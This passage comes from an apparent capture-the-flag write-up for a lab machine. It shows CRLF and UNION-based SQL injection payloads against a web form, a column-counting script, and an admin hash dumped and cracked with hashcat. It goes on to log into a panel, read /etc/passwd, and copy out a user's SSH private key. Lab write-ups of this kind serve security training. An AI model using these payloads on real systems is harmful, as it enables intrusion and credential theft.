</span><span class="gp">From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;</span><span class="w">
</span><span class="go">Subject: Flu Jab Appointment - Ref:
</span><span class="gp">Message-ID: &lt;655bc8a49b3bdd6acc1dae82abdec5fb@freeflujab.htb&gt;</span><span class="w">
</span><span class="go">X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
<span class="go">X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : test    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------   
</span></code></pre></div></div>

<blockquote>
  <p>The <code class="highlighter-rouge">Subject</code> header changed: <code class="highlighter-rouge">Subject: Flu Jab Appointment - Ref:</code></p>

  <p>The <code class="highlighter-rouge">REF</code> changed: <code class="highlighter-rouge">REF    : test</code></p>
</blockquote>

<h3 id="-test-2--header-injection-using-crlf"><strong style="text-decoration:underline"> TEST #2 : Header Injection using CRLF</strong></h3>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ data</span><span class="o">=</span><span class="s2">"nhsnum=NHS-921-376-3922%0d%0aSubject:%20test&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

<span class="nv">$ </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
</span><span class="gp">From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;</span><span class="w">
</span><span class="go">Subject: Flu Jab Appointment - Ref:
</span><span class="gp">Message-ID: &lt;c9fb2cef453e9a4ca88691ad507d6af1@freeflujab.htb&gt;</span><span class="w">
</span><span class="go">X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
<span class="go">X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : NHS-921-376-3922
Subject: test    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------   
</span></code></pre></div></div>

<blockquote>
  <p><code class="highlighter-rouge">Flu Jab Appointment - Ref:</code> at the <code class="highlighter-rouge">Subject</code> header still remains empty</p>

  <p>“<strong><code class="highlighter-rouge">\r\n</code></strong>” was only passed in <code class="highlighter-rouge">REF</code></p>
</blockquote>

<h3 id="test-3--sql-injection"><strong style="text-decoration:underline">TEST #3 : SQL Injection</strong></h3>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ data</span><span class="o">=</span><span class="s2">"nhsnum='+OR+'1'='1&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

<span class="nv">$ </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
</span><span class="gp">From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;</span><span class="w">
</span><span class="go">Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
</span><span class="gp">Message-ID: &lt;086a0e84f07f82f4e4f384a78f8dd9ac@freeflujab.htb&gt;</span><span class="w">
</span><span class="go">X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
<span class="go">X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : ' OR '1'='1    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------   
</span></code></pre></div></div>

<blockquote>
  <p><code class="highlighter-rouge">Ref:NHS-943-475-5911</code> appears in the <code class="highlighter-rouge">Subject</code> header which is different from the initial queries (<code class="highlighter-rouge">Ref:NHS-921-376-3922</code>)</p>

  <p>It’s now highly probable that the server is vulnerable to <strong>SQL injection</strong></p>
</blockquote>

<h3 id="sql-1--database-type"><strong style="text-decoration:underline">SQL #1 : DATABASE TYPE</strong></h3>

<p>Checking what database the service is using using the vulnerability found in the <strong><code class="highlighter-rouge">nhsnum</code></strong> parameter:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' OR sqlite_version()=sqlite_version() #
</span></code></pre></div></div>

<p>No message was sent to the mailserver.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' OR crc32('</span><span class="n">MySQL</span><span class="s1">')=crc32('</span><span class="n">MySQL</span><span class="s1">') #
</span></code></pre></div></div>

<p>It returns a successful query (<strong><code class="highlighter-rouge">Subject: Flu Jab Appointment - Ref:NHS-943-475-5911</code></strong>) which means the service is using <strong>MySQL</strong></p>

<blockquote>
  <p>SQLite will use <code class="highlighter-rouge">sqlite_master</code> to enumerate database content</p>

  <p>MySQL will use <code class="highlighter-rouge">information_schema</code> to enumerate database content</p>
</blockquote>

<h3 id="sql-2--query-columns"><strong style="text-decoration:underline">SQL #2 : QUERY COLUMNS</strong></h3>

<p>In order to perform <strong><em>UNION</em></strong> based SQL injections, it is essential to know how many columns are being returned by the original query.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">"https://freeflujab.htb/?remind"</span>

<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"Modus"</span><span class="p">:</span> <span class="s">"Q29uZmlndXJlPVRydWU</span><span class="si">%3</span><span class="s">D"</span><span class="p">,</span>
    <span class="s">"Patient"</span><span class="p">:</span> <span class="s">"daf23866abcb8e29ecee6d3da0caa992"</span><span class="p">,</span>
    <span class="s">"Registered"</span><span class="p">:</span>  <span class="s">"ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ</span><span class="si">%3</span><span class="s">D</span><span class="si">%3</span><span class="s">D"</span>
<span class="p">}</span>

<span class="n">query_columns</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"nhsnum"</span><span class="p">:</span> <span class="s">"' OR '1'='1' ORDER BY </span><span class="si">%</span><span class="s">d #"</span> <span class="o">%</span> <span class="p">(</span><span class="n">query_columns</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span>
    <span class="s">"submit"</span><span class="p">:</span> <span class="s">"Send Reminder"</span><span class="p">,</span>
    <span class="s">"email"</span><span class="p">:</span> <span class="s">"DutyNurse@flujab.htb"</span>
<span class="p">}</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s">"email"</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> <span class="k">break</span>
<span class="k">else</span><span class="p">:</span> <span class="n">query_columns</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">print</span><span class="p">(</span><span class="s">"THE ORIGINAL QUERY HAS </span><span class="si">%</span><span class="s">d COLUMNS"</span> <span class="o">%</span> <span class="p">(</span><span class="n">query_columns</span><span class="p">))</span>
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python union.py
<span class="go">
  THE ORIGINAL QUERY HAS 5 COLUMNS

</span></code></pre></div></div>

<h3 id="sql-3--information-leaks"><strong style="text-decoration:underline">SQL #3 : INFORMATION LEAKS</strong></h3>

<p>Now checking which column leaks information during query:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT '</span><span class="n">one</span><span class="s1">','</span><span class="n">two</span><span class="s1">','</span><span class="n">three</span><span class="s1">','</span><span class="n">four</span><span class="s1">','</span><span class="n">five</span><span class="s1">' #
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...omitted...
Subject: Flu Jab Appointment - Ref:three
...omitted...
</span></code></pre></div></div>

<p>The third column is output to the <code class="highlighter-rouge">Subject</code> header</p>

<h3 id="sql-4--database-information"><strong style="text-decoration:underline">SQL #4 : DATABASE INFORMATION</strong></h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,@@version,4,5 #
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...omitted...
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
...omitted...
</span></code></pre></div></div>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,system_user(),4,5 #
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...omitted...
Subject: Flu Jab Appointment - Ref:root@localhost
...omitted...
</span></code></pre></div></div>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,database(),4,5 #
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...omitted...
Subject: Flu Jab Appointment - Ref:vaccinations
...omitted...
</span></code></pre></div></div>

<p>The system is using <code class="highlighter-rouge">MariaDB</code> (just the same as <strong>MySQL</strong>) and is being hosted by the <strong><code class="highlighter-rouge">root</code></strong> user which meand that using high privilege commands should not be a problem.</p>

<p>The current database used by the service is <code class="highlighter-rouge">vaccinations</code></p>

<h3 id="sql-5--data-exfiltration"><strong style="text-decoration:underline">SQL #5 : DATA EXFILTRATION</strong></h3>

<p>Now that we have everything we need to perform UNION based SQL injections, let’s start by enumerating table names in the <strong><code class="highlighter-rouge">vaccinations</code></strong> database:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database(); #    
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...omitted...
Subject: Flu Jab Appointment - Ref:admin,admin_attribute,admin_password_request,adminattribute,admintoken,attachment,attribute,bounce,bounceregex,bounceregex_bounce,config,eventlog,i18n,linktrack,linktrack_forward,linktrack_ml,linktrack_uml_click,linktrack_userclick,list,listmessage,listuser,message,message_attachment,messagedata,sendprocess,subscribepage,subscribepage_data,template,templateimage,urlcache,user,user_attribute,user_blacklist,user_blacklist_data,user_history,user_message_bounce,user_message_forward,user_message_view,usermessage,userstats
...omitted...
</span></code></pre></div></div>

<p>There is an <strong><code class="highlighter-rouge">admin</code></strong> table which might contain useful credentials.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_schema=database() AND table_name='</span><span class="k">admin</span><span class="s1">'; #    
</span></code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...omitted...
Subject: Flu Jab Appointment - Ref:id,loginname,namelc,email,access,created,modified,modifiedby,password,passwordchanged,superuser,disabled,privileges
...omitted...
</span></code></pre></div></div>

<p>Dumping all values based on the column names listed above for the <strong><code class="highlighter-rouge">admin</code></strong> table:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(&lt;column_name&gt;),4,5 FROM admin; #
</span></code></pre></div></div>

<div style="overflow-x:auto">
  <table>
    <tr>
      <th>COLUMN</th>
      <th>VALUE</th>
    </tr>
    <tr>
      <td>id</td>
      <td>1</td>
    </tr>
    <tr>
      <td>loginname</td>
      <td>sysadm</td>
    </tr>
    <tr>
      <td>namelc</td>
      <td>administrator</td>
    </tr>
    <tr>
      <td>email</td>
      <td>syadmin@flujab.htb</td>
    </tr>
    <tr>
      <td>access</td>
      <td>sysadmin-console-01.flujab.htb</td>
    </tr>
    <tr>
      <td>created</td>
      <td>2018-07-02 08:45:19</td>
    </tr>
    <tr>
      <td>modified</td>
      <td>2018-12-02 00:01:02</td>
    </tr>
    <tr>
      <td>modifiedby</td>
      <td></td>
    </tr>
    <tr>
      <td>password</td>
      <td>a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602</td>
    </tr>
    <tr>
      <td>passwordchanged</td>
      <td>2018-07-02</td>
    </tr>
    <tr>
      <td>superuser</td>
      <td>1</td>
    </tr>
    <tr>
      <td>disabled</td>
      <td>0</td>
    </tr>
    <tr>
      <td>privileges</td>
      <td></td>
    </tr>
  </table>
</div>

<blockquote>
  <p>A new subdomain presents itself (<code class="highlighter-rouge">sysadmin-console-01.flujab.htb</code>)</p>

  <p>The <code class="highlighter-rouge">password</code> is encrypted using <strong>SHA-256</strong>:</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>hashcat <span class="nt">--force</span> <span class="nt">-m1400</span> a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602 /usr/share/wordlists/rockyou.txt 
<span class="go">  
  a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:th3doct0r

</span></code></pre></div></div>

<p>The password for <code class="highlighter-rouge">sysadm</code> is <code class="highlighter-rouge">th3doct0r</code></p>

<hr />

<h2 id="part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</h2>

<ol>
  <li>
    <p>Add <strong><code class="highlighter-rouge">sysadmin-console-01.flujab.htb</code></strong> to local <strong><code class="highlighter-rouge">/etc/hosts</code></strong>:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
...
10.10.10.124    sysadmin-console-01.flujab.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div>    </div>
  </li>
  <li>
    <p>Accessing <strong><code class="highlighter-rouge">https://sysadmin-console-01.flujab.htb</code></strong>:</p>

    <p><img src="./screenshots/24_flujab/443_sysadmin_console_01.png" alt="Direct IP Address not allowed" /></p>
  </li>
  <li>
    <p>Accessing over port <strong><em>8080</em></strong> (<strong><code class="highlighter-rouge">https://sysadmin-console-01.flujab.htb:8080</code></strong>):</p>

    <p><img src="./screenshots/24_flujab/8080_sysadmin_console_01_cwerror.gif" alt="cwerror_denied" /></p>

    <p>And checking the server response by requesting over <code class="highlighter-rouge">curl</code>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">-k</span> https://sysadmin-console-01.flujab.htb:8080
</code></pre></div>    </div>
    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">..., .. May 2019 ..:..:.. GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">178</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">https://clownware.htb/cwerror_denied.php</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
</code></pre></div>    </div>

    <p>The page has a <strong>Permanent Redirect</strong>(<strong><em>301</em></strong>) to <code class="highlighter-rouge">.../cwerror_denied.php</code> and it may be suffering from a <strong><em>cached redirect</em></strong>:</p>

    <blockquote>
      <p>Cached redirects could be bypassed by adding a <strong><em>trailing slash</em></strong> (“/”) or a <strong><em>unique</em></strong> parameter that hasn’t been cached (<strong><code class="highlighter-rouge">/?</code></strong>, <strong><code class="highlighter-rouge">/?something_unique</code></strong>, or <strong><code class="highlighter-rouge">/?unique=something</code></strong>)</p>
    </blockquote>

    <p>There was a <code class="highlighter-rouge">urlcache</code> table in the <code class="highlighter-rouge">vaccinations</code> database which may give a lead on how to proceed.</p>
  </li>
  <li>
    <p>Check the <code class="highlighter-rouge">urlcache</code> table in <code class="highlighter-rouge">vaccinations</code> using <code class="highlighter-rouge">nhsnum</code> in <strong><code class="highlighter-rouge">/?remind</code></strong></p>

    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_schema=database() AND table_name='</span><span class="n">urlcache</span><span class="s1">'; #
</span></code></pre></div>    </div>
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Subject: Flu Jab Appointment - Ref:id,url,lastmodified,added,content
</span></code></pre></div>    </div>
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="s1">' UNION SELECT 1,2,group_concat(url),4,5 FROM urlcache; #
</span></code></pre></div>    </div>
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Subject: Flu Jab Appointment - Ref:
</span></code></pre></div>    </div>

    <p>There doesn’t seem to be anything cached on the server. Clearing the browser cache (<code class="highlighter-rouge">Ctrl + Shift + Del</code> for FireFox) might help.</p>
  </li>
  <li>
    <p>Revisit <strong><code class="highlighter-rouge">https://sysadmin-console-01.flujab.htb:8080/?</code></strong>:</p>

    <p><img src="./screenshots/24_flujab/8080_sysadmin_console_01_ajenti.png" alt="Ajenti" /></p>

    <p>The redirect no longer goes to <strong><code class="highlighter-rouge">.../cwerror/denied.php</code></strong>. Instead, it now redirects to an <strong><em>Ajenti</em></strong> login page.</p>
  </li>
  <li>
    <p>Loggin using using <code class="highlighter-rouge">sysadm:th3doct0r</code> redirects you to:</p>

    <p><img src="./screenshots/24_flujab/8080_sysadmin_console_01_dashboard.png" alt="Ajenti Dashboard" /></p>
  </li>
  <li>
    <p>There is a <strong><em>Notepad</em></strong> plugin in the Ajenti service and the first thing I did was to enumerate the system users <strong><code class="highlighter-rouge">https://...:8080/view/notepad//etc/passwd</code></strong>:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
...
drno:x:1000:1000:drno,,,:/home/drno:/bin/rbash
...
nursejackie:x:1002:1006:,,,:/home/nursejackie:/bin/rbash
sysadm:x:1003:1007:,,,:/home/sysadm:/bin/rbash
drblack:x:1004:1008:,,,:/home/drblack:/bin/rbash
drwhite:x:1005:1009:,,,:/home/drwhite:/bin/rbash
drstrange:x:1006:1010:,,,:/home/drstrange:/bin/rbash
drfoster:x:1007:1011:,,,:/home/drfoster:/bin/rbash
dryi:x:1008:1012:,,,:/home/dryi:/bin/rbash
drpo:x:1009:1013:,,,:/home/drpo:/bin/rbash
drsmith:x:1010:1014:,,,:/home/drsmith:/bin/rbash
drjones:x:1011:1015:,,,:/home/drjones:/bin/rbash
drgreene:x:1012:1016:,,,:/home/drgreene:/bin/rbash
drshipman:x:1013:1017:,,,:/home/drshipman:/bin/rbash
drwho:x:1014:1018:,,,:/home/drwho:/bin/rbash
nursepeter:x:1015:1019:,,,:/home/nursepeter:/bin/rbash
nurseyi:x:1016:1020:,,,:/home/nurseyi:/bin/rbash
nursemoe:x:1017:1021:,,,:/home/nursemoe:/bin/rbash
drcrick:x:1018:1022:,,,:/home/drcrick:/bin/rbash
drstones:x:1019:1023:,,,:/home/drstones:/bin/rbash
nursewhitstone:x:1020:1024:,,,:/home/nursewhitstone:/bin/rbash
nursetumble:x:1021:1025:,,,:/home/nursetumble:/bin/rbash
nursewaters:x:1022:1026:,,,:/home/nursewaters:/bin/rbash
nursewalters:x:1023:1027:,,,:/home/nursewalters:/bin/rbash
nursebluecoats:x:1024:1028:,,,:/home/nursebluecoats:/bin/rbash
drme:x:1025:1029:,,,:/home/drme:/bin/rbash
drnu:x:1026:1030:,,,:/home/drnu:/bin/rbash
drre:x:1027:1031:,,,:/home/drre:/bin/rbash
drdre:x:1028:1032:,,,:/home/drdre:/bin/rbash
</code></pre></div>    </div>

    <p>There are a lot of system users and all but root has a restricted shell (<strong><code class="highlighter-rouge">/bin/rbash</code></strong>) and a mismatch of <code class="highlighter-rouge">uid</code>s and <code class="highlighter-rouge">gid</code>s</p>

    <p>Listing the contents of all the user directories, most are inaccessible except for the current user (<strong><code class="highlighter-rouge">sysadm</code></strong>) and <strong><code class="highlighter-rouge">drno</code></strong> which has an <strong><code class="highlighter-rouge">~/.ssh</code></strong> directory which contains a <strong><code class="highlighter-rouge">userkey</code></strong> file:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B
     
zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----
</code></pre></div>    </div>
  </li>
  <li>
    <p>Exporting the found private key and then connecting to 10.10.10.124 via <code class="highlighter-rouge">ssh</code>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">chmod </span>400 userkey
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> userkey <span class="nt">-l</span> drno 10.10.10.124
<span class="go">   
  ssh_exchange_identification: Connection closed by remote host
   
</span></code></pre></div>    </div>

    <p>The connection should work but it doesn’t. Opening the <strong><code class="highlighter-rouge">/etc/ssh/sshd_config</code></strong> file in the <strong><em>Ajenti Notepad</em></strong> to see how private keys are read:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nv">$OpenBSD</span>: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp <span class="nv">$ </span>
<span class="go">      
...omitted...

</span><span class="gp">#</span><span class="w"> </span>Expect .ssh/authorized_keys2 to be disregarded by default <span class="k">in </span>future.
<span class="go">AuthorizedKeysFile .ssh/authorized_keys access

...omitted...
</span></code></pre></div>    </div>

    <p>Public keys are read from <code class="highlighter-rouge">.ssh/authorized_keys</code> and/or <code class="highlighter-rouge">access</code> and reading from <strong><code class="highlighter-rouge">/home/drno/.ssh/authorized_keys</code></strong>:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
</code></pre></div>    </div>

